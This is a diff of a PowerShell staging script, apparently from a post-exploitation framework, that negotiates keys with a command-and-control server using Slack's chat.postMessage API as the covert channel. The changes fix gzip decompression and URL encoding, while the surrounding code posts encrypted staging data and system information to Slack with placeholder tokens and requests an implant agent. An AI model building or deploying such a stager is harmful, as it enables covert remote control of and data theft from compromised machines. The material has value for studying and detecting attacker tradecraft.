@@ -19,14 +19,18 @@ function Start-Negotiate {
         return [Convert]::ToBase64String($raw);
     }
 
-    function gunzip {param($data)
-        $input =  New-Object System.IO.MemoryStream ($data, $False);
+    function gunzip { param($data)
+        $input = New-Object System.IO.MemoryStream ($data, $False);
         $output = New-Object System.IO.MemoryStream;
-        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::DeCompress);
+        $gzipStream = New-Object System.IO.Compression.GzipStream ($input, [IO.Compression.CompressionMode]::DeCompress);
+        $buf = new-object byte[] 65536;
+        do {
+            $num_bytes = $gzipStream.Read($buf, 0, $buf.length);
+            $output.write($buf, 0, $num_bytes)
+        } while($num_bytes -gt 0);
 
-          $gzipStream.CopyTo($output);
-          $gzipStream.Close();
-        return $output.ToArray();
+        $gzipStream.dispose();
+        return $output.toArray();
     }
 
     function ConvertTo-RC4ByteStream {
@@ -82,6 +86,7 @@ function Start-Negotiate {
     # make sure the appropriate assemblies are loaded
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
+    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Web");
 
     # try to ignore all errors
     #$ErrorActionPreference = "SilentlyContinue";
@@ -164,7 +169,7 @@ function Start-Negotiate {
 
     #Write-Host "[*] Starting stage 3";
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $rc4p_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p));
+    $rc4p_base64=[System.Web.HttpUtility]::UrlEncode((Encode-Base64 $rc4p));
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p_base64&username=$($ID):3");
     $thread_ts=(ConvertFrom-Json20 $slack_response)["ts"];
 
@@ -305,7 +310,7 @@ function Start-Negotiate {
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
     start-sleep -seconds 2;
-    $rc4p2_base64=[System.Net.WebUtility]::UrlEncode((Encode-Base64 $rc4p2));
+    $rc4p2_base64=[System.Web.HttpUtility]::UrlEncode((Encode-Base64 $rc4p2));
     $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded');
     $slack_response=$wc.UploadString("https://slack.com/api/chat.postMessage","POST","token=REPLACE_SLACK_API_TOKEN&channel=REPLACE_SLACK_CHANNEL&text=$rc4p2_base64&username=$($ID):5");
     $thread_ts=(ConvertFrom-Json20 $slack_response)["ts"];
